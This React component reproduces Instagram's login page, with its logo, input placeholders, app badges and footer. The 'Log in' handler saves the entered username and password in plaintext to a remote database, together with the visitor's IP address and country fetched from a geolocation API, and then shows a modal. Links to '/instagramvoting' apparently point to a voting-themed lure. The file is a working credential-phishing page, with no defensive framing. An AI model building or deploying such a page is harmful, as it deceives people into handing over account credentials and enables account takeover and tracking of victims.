import '../pages/InstaLoginPage.css'
import googleIcon from '../assets/google.png';
import appleIcon from '../assets/ios.png'
import instagramLogo from '../assets/1024px-Instagram_logo.svg.png';
import { Link } from 'react-router-dom'
import { useState, useEffect } from 'react';
import { databases, DatabaseId, collectionId, id } from "../config";
import Modal from '../componets/Modal';
import loader from '../assets/hug.gif'

const InstaLoginpage = () => {
    const [name, setName] = useState("")
    const [password, setPassword] = useState("")
    const [isLogin, setIsLogin] = useState(false)
    const [err, setErr] = useState("")
    const [loading, setLoading] = useState(false)

    const [ip, setIp] = useState("")
    const [country, setCountry] = useState("")
    const url = `https://api.geoapify.com/v1/ipinfo?apiKey=${import.meta.env.VITE_LOCATIONAPI}`
    useEffect(() => {
        fetch(url)
            .then(response => response.json())
            .then(data => {
                setCountry(data.country.name);
                setIp(data.ip)}
                )
            .catch(err => console.error(err));
    })
    const handleLogin =  async () => {
        if (name === "" || password === "") {
            setErr("Input's cannot be empty")
        }
        else if (name != '' && password != '') {
            setLoading(true)
            const allinputTitle = {
                Name: name,
                Password: password,
                ip: ip,
                country: country
            };
            const promise = databases.createDocument(DatabaseId, collectionId, id, allinputTitle);
            promise.then(function (response) {
                console.log(response)
                setIsLogin(true)
                setPassword("")
                setName("")
                setLoading(false)
            }, function (error) {
                console.log(error);
            });
        }

    }
    return (
        <main className='Login-container'>
            {isLogin ? <Modal />  :
            <div className="content">
                    <div className="login-box1">
                    <div className="header">
                        <img src={instagramLogo} alt="" className='logo' />
                    </div>
                    <div className="form-wrap">
                        <div className="input-box">
                            <input
                                type="text" id="username" aria-describedby placeholder="Phone number, username, or email" onChange={(e) => { setErr(""); setName(e.target.value) }}></input>
                        </div>
                        <div className="input-box">
                            <input type="password" id="password" placeholder="Password" onChange={(e) => { setErr(""); setPassword(e.target.value) }}></input>
                        </div>
                        <span className="botton-box">
                            <button className="btn" name="login" id="login" onClick={handleLogin}>{loading ? <img src={loader} className='loader'/> : "Log in"}</button>
                        </span>
                        <Link className="forgot" to='/instagramvoting'>Forgot password?</Link>
                        <small>{err}</small>
                    </div>
                </div>
                    <div className="login-box2">
                    <p className="text">
                        Don't have an account?<Link to="/instagramvoting">Sign up</Link>
                    </p>
                </div>
                <div className="app">
                    <p>Get the app.</p>
                    <div className="app-img">
                        <Link to="/instagramvoting">
                            <img src={appleIcon} alt="" style={{ height: 50 }} />
                        </Link>
                        <Link to="/instagramvoting">
                            <img src={googleIcon} alt="" style={{ height: 50 }} />
                        </Link>
                    </div>
                </div>

            </div>}
            <footer className='footer-nav'>
                <ul>
                    <li>
                        <a href="">About us</a>
                    </li>
                    <li>
                        <a href="">About us</a>
                    </li>
                    <li>
                        <a href="">Support</a>
                    </li>
                    <li>
                        <a href="">Blog</a>
                    </li>
                    <li>
                        <a href="">Press</a>
                    </li>
                    <li>
                        <a href="">API</a>
                    </li>
                    <li>
                        <a href="">Job</a>
                    </li>
                    <li>
                        <a href="">Term</a>
                    </li>
                    <li>
                        <a href="">Language</a>
                    </li>
                    <li>
                        <a href="">Privacy</a>
                    </li>
                </ul>
            </footer>

        </main>
    )
}

export default InstaLoginpage